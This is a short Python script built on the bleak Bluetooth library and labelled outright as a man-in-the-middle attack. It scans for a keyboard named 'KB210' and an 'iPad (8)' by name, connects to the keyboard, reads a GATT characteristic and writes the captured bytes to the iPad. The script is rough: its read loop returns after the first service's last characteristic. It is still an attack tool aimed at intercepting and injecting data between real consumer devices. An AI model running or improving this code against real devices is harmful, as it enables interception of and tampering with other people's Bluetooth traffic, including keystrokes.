import asyncio
from bleak import BleakClient, BleakScanner
import logging

class MITMAttack:
    def __init__(self) -> None:
        return
    
    async def connect_to_device(self, name: str):
        device = await BleakScanner.find_device_by_name(name)
        if device is not None:
            logging.info(device)
            logging.info(f"{device.address=}")
            return device.address
        else:
            logging.warning("device not found")
            return None
    
    async def MITMAttack(self, target_device_address, receiver_device_address):
        async with BleakClient(target_device_address) as target_client:
            print(f"Connected to target device: {target_device_address}")

            captured_uuid, captured_data = await self.capture_data(target_client)

            if captured_data:
                async with BleakClient(receiver_device_address) as receiver_client:
                    print(f"connected to receiver device: {receiver_device_address}")

                    await self.send_data(receiver_client, captured_data, captured_uuid)
    
    async def capture_data(self, client):
        services = await client.get_services()
        for service in services:
            logging.info(f"Service: {service.uuid}")
            for characteristic in service.characteristics:
                logging.info(f"characteristic: {characteristic.uuid}")
                logging.info(f"properties: {characteristic.properties}")
            try:
                data = await client.read_gatt_char(characteristic.uuid)
                print(f"read value: {data}")
                return characteristic.uuid, data
            except Exception as e:
                logging.warning(f"Unable to mitm attack. {e=}")
    
    async def send_data(self, client, data, uuid):
        try:
            await client.write_gatt_char(uuid, data)
            print("Data sent successfully")
        except Exception as e:
            print(f"Failed to send data: {e}")

async def main():
    logging.basicConfig(level=logging.INFO)
    mitm_attack = MITMAttack()
    ipad_address = await mitm_attack.connect_to_device("iPad (8)")
    keyboard_address = await mitm_attack.connect_to_device("KB210")
    await mitm_attack.MITMAttack(keyboard_address, ipad_address)
    

if __name__ == "__main__":
    asyncio.run(main())
